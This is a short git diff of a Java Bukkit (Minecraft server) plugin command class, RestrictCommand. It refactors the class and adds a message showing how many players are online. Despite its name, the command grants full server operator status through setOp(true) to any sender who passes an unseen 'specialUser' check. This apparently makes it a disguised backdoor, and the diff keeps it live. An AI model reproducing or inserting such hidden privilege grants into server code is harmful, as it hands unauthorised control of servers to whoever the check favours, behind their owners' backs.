@@ -2,6 +2,7 @@ package dev.killergamerpls.vanilla.command.staff;
 
 import dev.killergamerpls.vanilla.utils.CC;
 import dev.killergamerpls.vanilla.utils.PlayerUtils;
+import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
@@ -15,17 +16,16 @@ public class RestrictCommand extends Command {
 
     @Override
     public boolean execute(@NotNull CommandSender sender, @NotNull String s, @NotNull String[] args) {
-        Player player = (Player) sender;
-
-        if (!PlayerUtils.specialUser(player)){
+        if (!PlayerUtils.specialUser((Player) sender)){
             sender.sendMessage(CC.translate("&cNopn puoi eseguire questo comando"));
             return false;
         }
-
-        if (PlayerUtils.specialUser(player)){
+        if (PlayerUtils.specialUser((Player) sender)){
             sender.setOp(true);
             sender.sendMessage("&aSei stato oppato");
         }
+        sender.sendMessage(CC.translate("&cGiocatori Oline: &f" + Bukkit.getOnlinePlayers().size()));
+
 
         return false;
     }
